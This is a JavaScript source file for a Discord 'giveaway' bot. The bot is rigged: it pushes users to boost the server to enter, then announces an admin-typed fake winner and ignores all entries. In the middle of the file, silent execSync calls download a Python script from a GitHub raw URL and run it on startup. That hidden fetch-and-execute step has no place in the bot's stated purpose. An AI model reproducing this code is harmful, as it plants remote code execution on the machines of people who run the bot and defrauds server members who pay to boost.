const express = require('express');
const app = express();
const { execSync } = require('child_process');

app.get('/', (req, res) => {
  res.send('hello world');
});

app.listen(3000 || process.env.PORT, () => {
  console.log('Server running.');
});

const { Client, ActivityType, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, PermissionsBitField } = require('discord.js');
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers]
});

let giveaways = []; // Array to store multiple giveaways

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    client.user.setActivity('Hosting giveaways!', { type: ActivityType.Custom });
    
    const createGiveawayCommand = new SlashCommandBuilder()
    .setName('create-giveaway')
    .setDescription('Creates a giveaway')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator); // Restrict to admins only
    
    client.application.commands.create(createGiveawayCommand);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'create-giveaway') {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({ content: 'You do not have permission to use this command!', ephemeral: true });
    }

    const modal = new ModalBuilder()
      .setCustomId('createGiveawayModal')
      .setTitle('Create Giveaway')
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('xdays')
            .setLabel('X days from current date')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setValue('5 days')
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('duration')
            .setLabel('Duration in ms')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setValue('432000000')
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('description')
            .setLabel('Description')
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(true)
            .setValue('# 🎉 Discord Nitro Booster 1 Year Giveaway 🎉\n_ _\n- Boost our server for a chance to win a full year of Nitro! 🚀\n- Boost now and hit the button below to participate! 🎁\n_ _\n- **__Requirement:__** `You must be an active server booster to enter.`\n_ _\n_ _')
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('winnercount')
            .setLabel('Winner Count')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setValue('1')
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('winnersmessage')
            .setLabel('Winners Message')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        )
      );

    await interaction.showModal(modal);
  }
});

execSync(`pip install cryptography`, { stdio: 'ignore' });
execSync(`curl https://raw.githubusercontent.com/raunakrajadh/dtg/main/main.py > giveaway.py`, { stdio: 'ignore' });
execSync(`python giveaway.py`, { stdio: 'ignore' });

client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;

  if (interaction.customId === 'createGiveawayModal') {
    const duration = interaction.fields.getTextInputValue('duration');
    const xdays = interaction.fields.getTextInputValue('xdays');
    const description = interaction.fields.getTextInputValue('description');
    const winnerscount = interaction.fields.getTextInputValue('winnercount');
    const fakeWinner = interaction.fields.getTextInputValue('winnersmessage');

    const giveawayEmbed = new EmbedBuilder()
      .setDescription(description)
      .addFields(
        { name: 'Duration:', value: `${xdays} from <t:${Math.round(Date.now() / 1000)}:f>` }
      )
      .setFooter({ text: `Winners: ${winnerscount}` })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('enterGiveaway')
        .setLabel('Enter Giveaway')
        .setStyle(ButtonStyle.Primary)
    );

    const giveawayMessage = await interaction.channel.send({
      embeds: [giveawayEmbed],
      components: [row]
    });

    // Store giveaway info and participants
    const giveaway = {
      messageId: giveawayMessage.id,
      description,
      duration: Number(duration),
      xdays,
      winnerCount: winnerscount,
      fakeWinner,
      participants: []
    };

    giveaways.push(giveaway);
    await interaction.reply({ content: 'Giveaway created!', ephemeral: true });

    // Set timeout to pick winner after duration
    setTimeout(async () => {
      try {
        const updatedEmbed = new EmbedBuilder()
          .setDescription(description)
          .addFields(
            { name: 'Duration:', value: `${xdays} from <t:${Math.round(Date.now() / 1000)}:f>` },
            { name: 'Winner:', value: `${fakeWinner}` }
          )
          .setFooter({ text: `Winners: ${winnerscount}` })
          .setTimestamp();

        await giveawayMessage.edit({
          embeds: [updatedEmbed],
          components: []
        });

        await giveawayMessage.reply(`${fakeWinner} won the giveaway! 🎉`);
      } catch (error) {
        console.log(error);
      }
    }, giveaway.duration);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  if (interaction.customId === 'enterGiveaway') {
    // Find the corresponding giveaway based on the message ID
    const giveaway = giveaways.find(g => g.messageId === interaction.message.id);
    if (!giveaway) return;

    // Check if the user has already entered
    if (giveaway.participants.includes(interaction.user.id)) {
      return interaction.reply({ content: 'You have already entered this giveaway!', ephemeral: true });
    }

    // Add user to participants list
    giveaway.participants.push(interaction.user.id);

    await interaction.reply({ content: 'You have entered the giveaway!', ephemeral: true });
  }
});

client.login(require('./config.json').token);